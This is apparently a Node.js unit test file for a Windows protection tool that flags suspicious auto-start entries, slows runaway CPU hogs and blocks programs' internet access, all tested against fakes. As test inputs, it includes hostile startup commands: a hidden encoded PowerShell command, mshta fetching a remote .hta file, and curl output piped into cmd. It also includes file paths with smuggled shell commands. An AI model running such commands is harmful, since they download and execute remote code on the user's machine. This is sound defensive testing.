'use strict'
// Unit tests: process census parsers, Auto-Shield rules and its runtime (with fake Windows, nothing is really changed).
const assert = require('node:assert/strict')
const path = require('node:path')
const C = require('../census')
const S = require('../shield')

// ------------------------------------------------------------ census parsers
{
  const tl = ['"System Idle Process","0","Services","0","8 K"', '"chrome.exe","4242","Console","1","310,456 K"', '"chrome.exe","4243","Console","1","1,024,000 K"', '"System","4","Services","0","12 K"', 'garbage'].join('\r\n')
  const p = C.parseTasklist(tl)
  assert.deepEqual(p, [{ pid: 4242, name: 'chrome', mb: 303 }, { pid: 4243, name: 'chrome', mb: 1000 }])
  const g = C.topCulprits(p, 4)
  assert.deepEqual(g.mem, { name: 'chrome', mb: 1303, count: 2, pid: 4243 }, 'grouped by name; target is the heaviest single process')
  assert.equal(g.cpu, null, 'no cpu data, no cpu culprit')
  assert.equal(C.topCulprits(p, 4, (x) => x.name === 'chrome').mem, null, 'skipped (protected) names never become culprits')
}
{
  const csv = [
    '"(PDH-CSV 4.0)","\\\\PC\\Process(Idle)\\% Processor Time","\\\\PC\\Process(Lyra)\\% Processor Time","\\\\PC\\Process(Lyra#1)\\% Processor Time","\\\\PC\\Process(Idle)\\ID Process","\\\\PC\\Process(Lyra)\\ID Process","\\\\PC\\Process(Lyra#1)\\ID Process"',
    '"10/18/2026 05:00:00.000","300.0","1.0","2.0","0","111","222"',
    '"10/18/2026 05:00:01.000","200.5","90.25","40.5","0","111","222"',
    'Exiting, please wait...'
  ].join('\r\n')
  const r = C.parseTypeperf(csv)
  assert.deepEqual(r, [{ pid: 111, name: 'Lyra', cpu: 90.25 }, { pid: 222, name: 'Lyra', cpu: 40.5 }], 'last sample, instance suffix removed, idle skipped')
  assert.deepEqual(C.parseTypeperf('nonsense'), [])
  const top = C.topCulprits(r, 4)
  assert.equal(top.cpu.name, 'Lyra')
  assert.equal(top.cpu.pid, 111)
  assert.ok(Math.abs(top.cpu.share - 0.3275) < 0.001)
  assert.deepEqual([...C.parsePaths('111|S:\\Lyra\\Lyra.exe\r\n222|\r\nbad')], [[111, 'S:\\Lyra\\Lyra.exe']])
}

// ------------------------------------------------------------ pure rules
for (const [p, loc] of [
  ['C:\\Users\\a\\AppData\\Local\\Temp\\x\\evil.exe', 'temp'],
  ['C:\\Windows\\Temp\\a.exe', 'temp'],
  ['C:\\Users\\a\\Downloads\\setup.exe', 'downloads'],
  ['C:\\Users\\Public\\p.exe', 'public'],
  ['C:\\$Recycle.Bin\\S-1\\x.exe', 'recycle'],
  ['C:\\Program Files\\App\\app.exe', ''],
  ['S:\\Lyra\\Lyra.exe', ''],
  ['', '']
]) assert.equal(S.locationOf(p), loc, p)

assert.equal(S.isProtected('svchost'), true)
assert.equal(S.isProtected('Spidey Sense'), true)
assert.equal(S.isProtected('chrome'), false)
assert.equal(S.isProtected('anything', 'C:\\Windows\\System32\\foo.exe'), true, 'anything inside the Windows folder is protected')
assert.equal(S.extractExe('"C:\\Program Files\\A B\\a.exe" --x'), 'C:\\Program Files\\A B\\a.exe')
assert.equal(S.extractExe('C:\\a\\b.exe -x'), 'C:\\a\\b.exe')

const reg = (value, key = String.raw`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`) => ({ kind: 'reg', key, name: 'X', value })
assert.equal(S.judgeStartup(reg('"C:\\Users\\a\\AppData\\Local\\Temp\\upd.exe"')).verdict, 'block')
assert.match(S.judgeStartup(reg('"C:\\Users\\a\\Downloads\\k.exe"')).reason, /Downloads/)
assert.equal(S.judgeStartup(reg('powershell -w hidden -enc AAAA')).verdict, 'block')
assert.equal(S.judgeStartup(reg('mshta http://x/y.hta')).verdict, 'block')
assert.equal(S.judgeStartup(reg('cmd /c curl https://x.y/z | cmd')).verdict, 'block')
assert.equal(S.judgeStartup(reg('"C:\\Program Files\\Zoom\\zoom.exe" /autostart')).verdict, 'watch', 'normal programs are only reported')
assert.equal(S.judgeStartup(reg('"C:\\Users\\a\\AppData\\Local\\Temp\\upd.exe"', String.raw`HKLM\Software\Microsoft\Windows\CurrentVersion\Run`)).verdict, 'watch', 'machine-wide entries are never blocked by a user-level app')
assert.equal(S.judgeStartup({ kind: 'folder', name: 'a.lnk', value: 'C:\\Users\\a\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\a.lnk' }).verdict, 'watch')
assert.equal(S.judgeStartup({ kind: 'folder', name: 'x.vbs', value: 'C:\\Users\\a\\AppData\\Roaming\\Startup\\x.vbs' }).verdict, 'watch')
assert.equal(S.judgeStartup({ kind: 'folder', name: 'x.bat', value: 'wscript C:\\a\\x.vbs' }).verdict, 'block')

assert.deepEqual(S.parseRegValue('\r\nHKEY_CURRENT_USER\\X\r\n    My App    REG_SZ    "C:\\a b\\c.exe" -x\r\n', 'My App'), { type: 'REG_SZ', value: '"C:\\a b\\c.exe" -x' })
assert.equal(S.parseRegValue('nothing', 'x'), null)

// runaway detector: 3 hits in a row at >= 30% of the whole cpu, reported once
{
  const t = S.createTamer()
  const hog = { pid: 7, name: 'miner', cpu: 200 } // 2 cores of 4 = 50%
  assert.deepEqual(t.feed([hog], 4), [])
  assert.deepEqual(t.feed([hog], 4), [])
  assert.deepEqual(t.feed([hog], 4), [{ pid: 7, name: 'miner', share: 0.5 }])
  assert.deepEqual(t.feed([hog], 4), [], 'only once')
  const t2 = S.createTamer()
  t2.feed([hog], 4)
  t2.feed([hog], 4)
  t2.feed([{ ...hog, cpu: 10 }], 4)
  assert.deepEqual(t2.feed([hog], 4), [], 'a calm moment resets the count')
  assert.deepEqual(S.createTamer().feed([{ pid: 1, name: 'x', cpu: 90 }], 4), [], 'one busy core of four is not a runaway')
}

// firewall commands only for risky-folder programs, with a hostile-path guard
{
  const ok = S.buildFirewallCommands('C:\\Users\\a\\Downloads\\bad prog.exe')
  assert.equal(ok.rule, 'Spidey Shield block bad_prog.exe')
  assert.deepEqual(ok.commands[0], ['advfirewall', 'firewall', 'add', 'rule', 'name=Spidey Shield block bad_prog.exe', 'dir=out', 'action=block', 'program=C:\\Users\\a\\Downloads\\bad prog.exe', 'enable=yes'])
  for (const bad of ['C:\\Program Files\\App\\a.exe', 'relative\\a.exe', 'C:\\Users\\a\\Downloads\\a.txt', 'C:\\Users\\a\\Downloads\\a"; calc;".exe', 'C:\\Users\\a\\Downloads\\%x%.exe', 'C:\\Users\\a\\Downloads\\a&b.exe', '', null]) assert.equal(S.buildFirewallCommands(bad), null, String(bad))
  const args = S.elevatedNetshArgs(ok.commands)
  assert.equal(args[0], '-NoProfile')
  const cmd = args[args.length - 1]
  assert.match(cmd, /-Verb RunAs/)
  const inner = Buffer.from(/'([A-Za-z0-9+/=]+)'$/.exec(cmd)[1], 'base64').toString('utf16le')
  assert.match(inner, /& netsh advfirewall firewall add rule name="Spidey Shield block bad_prog.exe" dir=out action=block program="C:\\Users\\a\\Downloads\\bad prog.exe" enable=yes/)
  assert.match(inner, /dir=in/)
}

// ------------------------------------------------------------ runtime with fakes
const tmp = require('node:fs').mkdtempSync(path.join(require('node:os').tmpdir(), 'shield-'))
function make(over = {}) {
  const events = []
  const calls = []
  const regStore = new Map()
  const fakeRun = async (cmd, args) => {
    calls.push([cmd, ...args])
    if (cmd === 'reg.exe' && args[0] === 'query') {
      const v = regStore.get(args[1] + '|' + args[3])
      return { ok: !!v, out: v ? `\r\n${args[1]}\r\n    ${args[3]}    ${v.type}    ${v.value}\r\n` : '' }
    }
    if (cmd === 'reg.exe' && args[0] === 'delete') {
      regStore.delete(args[1] + '|' + args[3])
      return { ok: true, out: '' }
    }
    if (cmd === 'reg.exe' && args[0] === 'add') {
      regStore.set(args[1] + '|' + args[3], { type: args[5], value: args[7] })
      return { ok: true, out: '' }
    }
    return { ok: true, out: '' }
  }
  const prio = new Map([[10, 0], [11, 0]])
  const killed = []
  let modeNow = over.mode || 'smart'
  const sh = S.createShield({
    dataDir: path.join(tmp, String(Math.random())),
    emit: (e) => events.push(e),
    mode: () => modeNow,
    run: fakeRun,
    cores: 4,
    manual: true,
    learnMs: over.learnMs ?? 0,
    osApi: {
      constants: { priority: { PRIORITY_BELOW_NORMAL: 10 } },
      getPriority: (pid) => {
        if (!prio.has(pid)) throw new Error('no such process')
        return prio.get(pid)
      },
      setPriority: (pid, v) => {
        if (!prio.has(pid)) throw new Error('no such process')
        prio.set(pid, v)
      }
    },
    kill: (pid) => killed.push(pid),
    cen: over.cen || {
      memory: async () => [
        { pid: 10, name: 'miner', mb: 300 },
        { pid: 11, name: 'svchost', mb: 900 }
      ],
      cpu: async () => [
        { pid: 10, name: 'miner', cpu: 300 },
        { pid: 11, name: 'svchost', cpu: 300 }
      ],
      paths: async () => new Map(),
      topCulprits: C.topCulprits
    }
  })
  return { sh, events, calls, regStore, prio, killed, setMode: (m) => (modeNow = m) }
}

;(async () => {
  const RUN = String.raw`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`

  // --- smart mode blocks a suspicious new auto-start entry, backs it up, and undo restores it exactly
  {
    const t = make()
    t.regStore.set(`${RUN}|Updater`, { type: 'REG_SZ', value: '"C:\\Users\\a\\AppData\\Local\\Temp\\upd.exe" -silent' })
    assert.equal(t.sh.onStartup(`${RUN}|Updater|"C:\\Users\\a\\AppData\\Local\\Temp\\upd.exe" -silent`), true, 'Shield reports it itself')
    await new Promise((r) => setTimeout(r, 20))
    assert.equal(t.regStore.has(`${RUN}|Updater`), false, 'entry removed')
    assert.equal(t.events.length, 1)
    assert.equal(t.events[0].kind, 'shield')
    assert.equal(t.events[0].undo, true)
    assert.match(t.events[0].text, /Blocked a new auto-start entry "Updater".*Temp/)
    const id = t.events[0].id
    assert.equal((await t.sh.undo(id)).ok, true)
    assert.deepEqual(t.regStore.get(`${RUN}|Updater`), { type: 'REG_SZ', value: '"C:\\Users\\a\\AppData\\Local\\Temp\\upd.exe" -silent' }, 'restored byte for byte')
    assert.equal(t.sh.log()[0].undo, undefined, 'undone entries cannot be undone twice')
    assert.equal((await t.sh.undo(id)).ok, false)
  }
  // --- normal programs and machine-wide entries are left to Guardian
  {
    const t = make()
    assert.equal(t.sh.onStartup(`${RUN}|Zoom|"C:\\Program Files\\Zoom\\zoom.exe" /autostart`), false)
    assert.equal(t.sh.onStartup(String.raw`HKLM\Software\Microsoft\Windows\CurrentVersion\Run|Evil|C:\Users\a\Downloads\x.exe`), false)
    assert.equal(t.sh.onStartup(`${RUN}|SpideySense|C:\\x\\Spidey Sense.exe --autostart`), false)
    assert.equal(t.events.length, 0)
    assert.equal(t.calls.filter((c) => c[1] === 'delete').length, 0, 'nothing deleted')
  }
  // --- ask mode only offers; off does nothing; the offer works once
  {
    const t = make({ mode: 'ask' })
    t.regStore.set(`${RUN}|Updater`, { type: 'REG_SZ', value: 'mshta http://x/y.hta' })
    assert.equal(t.sh.onStartup(`${RUN}|Updater|mshta http://x/y.hta`), true)
    assert.equal(t.regStore.has(`${RUN}|Updater`), true, 'nothing removed without a click')
    assert.equal(t.events[0].undo, false)
    assert.ok(t.events[0].offer && t.events[0].offer.label === 'BLOCK IT')
    assert.equal((await t.sh.apply(t.events[0].offer.id)).ok, true)
    assert.equal(t.regStore.has(`${RUN}|Updater`), false)
    assert.equal((await t.sh.apply(t.events[0].offer.id)).ok, false, 'an offer works once')
    t.setMode('off')
    assert.equal(t.sh.onStartup(`${RUN}|Updater2|mshta http://x/y.hta`), false)
  }
  // --- a runaway program is tamed (smart), asked about (ask), and undo restores the priority
  {
    const t = make()
    for (let i = 0; i < 3; i++) await t.sh._sampleCpu()
    assert.equal(t.prio.get(10), 10, 'miner lowered to below normal')
    assert.equal(t.prio.get(11), 0, 'svchost is protected: untouched')
    assert.equal(t.events.filter((e) => e.kind === 'shield' && e.undo).length, 1)
    assert.match(t.events[0].text, /miner kept using 75% of the CPU/)
    await t.sh.undo(t.events[0].id)
    assert.equal(t.prio.get(10), 0, 'priority restored')
  }
  {
    const t = make({ mode: 'ask' })
    for (let i = 0; i < 3; i++) await t.sh._sampleCpu()
    assert.equal(t.prio.get(10), 0, 'ask mode changes nothing alone')
    const ev = t.events.find((e) => e.offer)
    assert.ok(ev && ev.offer.label === 'LOWER ITS PRIORITY')
    assert.equal((await t.sh.apply(ev.offer.id)).ok, true)
    assert.equal(t.prio.get(10), 10)
  }
  // --- hint(): only a busy CPU for several seconds triggers the (3 s) CPU measurement
  {
    let sampled = 0
    const t = make({ cen: { memory: async () => [], cpu: async () => (sampled++, []), paths: async () => new Map(), topCulprits: C.topCulprits } })
    for (let i = 0; i < 7; i++) t.sh.hint(95)
    await new Promise((r) => setTimeout(r, 10))
    assert.equal(sampled, 0)
    t.sh.hint(95)
    await new Promise((r) => setTimeout(r, 10))
    assert.equal(sampled, 1, 'eight busy seconds -> one measurement')
    t.sh.hint(20)
  }
  // --- take it down: only scanned, unprotected processes
  {
    const t = make()
    await t.sh._memTick()
    assert.equal(t.sh.takeDown(10).ok, true)
    assert.deepEqual(t.killed, [10])
    assert.equal(t.sh.takeDown(11).ok, false, 'svchost is protected')
    assert.match(t.sh.takeDown(11).error, /protected/)
    assert.equal(t.sh.takeDown(99999).ok, false, 'a pid we never saw')
    assert.deepEqual(t.killed, [10])
    assert.deepEqual(t.sh.hog(), { name: 'miner', mb: 300 }, 'the radar caption never names a protected system program')
  }
  // --- programs that start from Downloads/Temp are reported (not killed), once, never while learning
  {
    const exe = 'C:\\Users\\a\\Downloads\\totally-legit.exe'
    let phase = 0
    const cen = {
      memory: async () => (phase === 0 ? [{ pid: 20, name: 'chrome', mb: 100 }] : [{ pid: 20, name: 'chrome', mb: 100 }, { pid: 30, name: 'totally-legit', mb: 20 }]),
      cpu: async () => null,
      paths: async (pids) => new Map(pids.includes(30) ? [[30, exe]] : []),
      topCulprits: C.topCulprits
    }
    const t = make({ cen })
    await t.sh._memTick()
    phase = 1
    await t.sh._memTick()
    assert.equal(t.events.length, 1)
    assert.match(t.events[0].text, /totally-legit just started from your Downloads folder/)
    assert.equal(t.events[0].offer.label, 'BLOCK ITS INTERNET')
    await t.sh._memTick()
    assert.equal(t.events.length, 1, 'only once')
    const learn = make({ cen, learnMs: 3 * 60 * 1000 })
    phase = 0
    await learn.sh._memTick()
    phase = 1
    await learn.sh._memTick()
    assert.equal(learn.events.length, 0, 'silent while it is still learning what is normal')
  }
  console.log('shield: ALL PASS')
})().catch((e) => {
  console.error(e)
  process.exit(1)
})
